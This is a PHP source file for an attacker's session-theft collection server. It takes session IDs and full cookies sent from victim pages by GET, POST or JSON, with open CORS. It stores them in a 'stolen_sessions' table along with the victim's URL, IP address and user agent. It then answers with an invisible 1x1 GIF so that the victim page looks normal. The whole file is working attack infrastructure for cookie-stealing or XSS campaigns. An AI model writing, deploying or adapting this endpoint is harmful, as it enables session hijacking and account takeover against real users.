<?php
require_once __DIR__ . '/db.php';

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;

$sid    = $_GET['sid']   ?? $_POST['sid']   ?? '';
$cookie = $_GET['c']     ?? $_POST['c']     ?? '';
$url    = $_GET['url']   ?? $_POST['url']   ?? '';
$method = $_GET['m']     ?? $_POST['m']     ?? 'unknown';

if (empty($sid) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    $j = json_decode($raw, true);
    if (is_array($j)) {
        $sid    = $j['sid']    ?? $sid;
        $cookie = $j['cookie'] ?? $cookie;
        $url    = $j['url']    ?? $url;
        $method = $j['method'] ?? $method;
    }
}

if ($sid !== '' || $cookie !== '') {
    $stmt = attacker_db()->prepare('
        INSERT INTO stolen_sessions (sid, cookie_full, victim_url, victim_ip, victim_ua, exfil_method)
        VALUES (:s, :c, :u, :ip, :ua, :m)
    ');
    $stmt->execute([
        ':s'  => $sid,
        ':c'  => $cookie,
        ':u'  => $url,
        ':ip' => $_SERVER['REMOTE_ADDR'] ?? '',
        ':ua' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500),
        ':m'  => $method,
    ]);
}

// GIF 1x1 transparent pour ne pas casser le rendu de la page victime
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
